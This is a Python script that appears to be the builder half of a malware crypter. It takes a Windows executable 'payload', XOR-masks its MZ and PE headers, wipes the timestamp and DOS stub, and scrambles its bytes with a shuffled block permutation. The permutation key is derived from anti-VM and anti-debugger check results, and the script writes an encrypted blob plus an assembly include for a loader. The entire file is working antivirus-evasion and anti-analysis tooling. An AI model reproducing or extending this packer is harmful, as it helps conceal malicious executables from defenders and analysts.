#!/usr/bin/python
# -*- coding: utf-8 -*-


import random
import sys
import struct

# Clean UP the standard PE Dos Stub
# Implement the Bonneteau Cypher, no entropy impact
# Variable Keylen
# Ex :
#    Key =  13402
#    Data =  01234 56789
#    Result = 1340268957

if __name__ == '__main__':
  
  #  include = include + ('RANDOM8 equ 0x%X ; Random 8 bits\n' % random.randrange(0xff))
  RANDOM8 = random.randrange(0xfe) + 1
  
 
  # Generate AntiVM/Re Xor key
  RANDOMK1 = random.randrange(0xfe)+1  # Filename change 
  RANDOMK2 = random.randrange(0xfe) + 1 # No net modules
  RANDOMK3 = random.randrange(0xfe) + 1 # Is Debugged
  RANDOMK4 = random.randrange(0xfe) + 1 # Found Debugger Name
  RANDOMK5 = random.randrange(0xfe) + 1 # Cpu Virt

  RANDOMKF1 = random.randrange(0xfe)+1  # failed Filename change 
  RANDOMKF2 = random.randrange(0xfe) + 1 # failed No net modules
  RANDOMKF3 = random.randrange(0xfe) + 1 # failed Is Debugged
  RANDOMKF4 = random.randrange(0xfe) + 1 # failed Found Debugger Name
  RANDOMKF5 = random.randrange(0xfe) + 1 # failed Cpu Virt


  RANDOMDK = RANDOMK5 ^ RANDOMK4 ^ RANDOMK3 ^ RANDOMK2 ^ RANDOMK1

  print ('* Xor Key for BBox is %X. based on %X %X %X %X %X' % (RANDOMDK, RANDOMK1, RANDOMK2, RANDOMK3, RANDOMK4, RANDOMK5)) 

  # Charge le payload
  try:
    print ('* Loading payload: %s' % sys.argv[1])
    f = open(sys.argv[1],'r')
    payload = bytearray(f.read())
    f.close()
    payload_len = len(payload)
    print ('* Payload len: %d bytes' % (payload_len))
  except:
    print('** Error opening file')
    exit(1)
  
  
  # Clean UP DOS Stub
  S = struct.Struct('<H')
  idxdospay = S.unpack_from(buffer(bytearray(payload[0x18:0x18+2])))[0] 
  S = struct.Struct('<I')
  pelocation = (  S.unpack_from(buffer(bytearray(payload[0x3c:0x3c+4])))[0] )  
  lendospay=pelocation-idxdospay
  print ('* Dos Code at 0x%X for 0x%X bytes' % (idxdospay,lendospay))
  dosstub=bytearray()
  IDX=0
 
  # Xor PE 
  print('* PE Header Location at 0x%X ' %(pelocation))
  print('* Obfuscating PE and MZ Headers, Clean Timestamp')
  
  # Xor MZ..(ZM is also valid)
  payload[0x0] = ord('Z') ^ RANDOM8
  payload[0x1] = ord('M') ^ RANDOM8
  # Xor PE
  payload[pelocation+0x0] = payload[pelocation] ^ RANDOM8
  payload[pelocation+0x1] = payload[pelocation+0x1] ^ RANDOM8
  #Erase PE Timestamp
  payload[pelocation+0x4+0x4] = 0
  payload[pelocation+0x4+0x4+1] = 0
  payload[pelocation+0x4+0x4+2] = 0
  payload[pelocation+0x4+0x4+3] = 0

  dospay = 0xb8,0x00,0x4c,0xcd,0x21
  dospay = ""
  for I in range(0,idxdospay):
    dosstub[I:I+1] = payload[I:I+1]
    IDX=IDX+1
  for I in ( dospay ):  # mov ax,0x4c00; Int 0x21
    dosstub.append(I)
    IDX=IDX+1
  for I in range(0,lendospay - len (dospay)):
    dosstub.append(0x00)
    IDX=IDX+1
  for I in range(IDX,payload_len):
    dosstub[I:I+1] = payload[I:I+1]
  
  
  payload = dosstub 

  # Choisis une taille de BBOX de 128 a 256 bytes
  bboxlen = random.randrange(128)+128
 
  #payload = [ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
  #payload_len = len (payload)
  #bboxlen = random.randrange(5)+1
  print ('* BBox Len: %d' % bboxlen)


  # Genere le BBox Array
  bboxarray=[]
  for i in range(0,bboxlen):
    bboxarray.append(i)
  random.shuffle(bboxarray)
  
  #opayload = bytearray(bboxarray)

  fullrow = payload_len // bboxlen 
  restrow = payload_len % bboxlen
  
  print ('* Ready to Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
  
  if not restrow == 0:
    print ('* Adding %d padding bytes' % (bboxlen-restrow))
    for i in range(0,bboxlen-restrow):
      payload.append(0x00)
    payload_len = payload_len + (bboxlen- restrow)
    fullrow = payload_len // bboxlen 
    restrow = payload_len % bboxlen
    print ('* Final Process %dx%d bytes row and %d bytes' % (fullrow,bboxlen,restrow)) 
  
  
  print bboxarray
  bboxarrayxor= []
  #Place la bbox xorée devant le payload bboxe 
  for J in range (0,bboxlen ):
    bboxarrayxor.append( bboxarray[J] ^ RANDOMDK)
  
  print bboxarrayxor
  opayload = bytearray(bboxarrayxor)

  for BBraw in range(0,fullrow):
    for I in bboxarray:
      opayload.append(payload[(BBraw*bboxlen)+I])
     # print hex(payload[(BBraw*bboxlen)+I]) ,
    #print ""
  #opayload = payload


  out = bytearray(opayload)
  

  with open('payload.bin',"w") as f:
    f.write(out)

  include = ('PELEN dd 0x%X ; PE Len\n' % payload_len)
  include = include + ('%%define BBLEN  0x%X ; BBox Key Len\n' % bboxlen) 
  include = include + ('%%define EPELEN  0x%X; PE Len equ\n' % payload_len)
  include = include + ('%%define RANDOMs 0x%X ; Random 4 bits\n' % random.randrange(0x16))
  include = include + ('%%define RANDOM8 0x%X ; Random 8 bits\n' % RANDOM8)
  include = include + ('%%define RANDOM16 0x%X ; Random 16 bits\n' % random.randrange(0xffff))
  include = include + ('%%define RANDOM32 0x%X ; Random 32 bits\n' % random.randrange(0xffffffff)) 
  
  include = include + ('%%define RANDOMK1 0x%X ; Random 8 bits\n' % RANDOMK1)
  include = include + ('%%define RANDOMK2 0x%X ; Random 8 bits\n' % RANDOMK2)
  include = include + ('%%define RANDOMK3 0x%X ; Random 8 bits\n' % RANDOMK3)
  include = include + ('%%define RANDOMK4 0x%X ; Random 8 bits\n' % RANDOMK4)
  include = include + ('%%define RANDOMK5 0x%X ; Random 8 bits\n' % RANDOMK5)
  
  include = include + ('%%define RANDOMKF1 0x%X ; Random 8 bits\n' % RANDOMKF1)
  include = include + ('%%define RANDOMKF2 0x%X ; Random 8 bits\n' % RANDOMKF2)
  include = include + ('%%define RANDOMKF3 0x%X ; Random 8 bits\n' % RANDOMKF3)
  include = include + ('%%define RANDOMKF4 0x%X ; Random 8 bits\n' % RANDOMKF4)
  include = include + ('%%define RANDOMKF5 0x%X ; Random 8 bits\n' % RANDOMKF5)
  
  
  
  with open('payload.inc', 'w') as f:
     f.write(include)

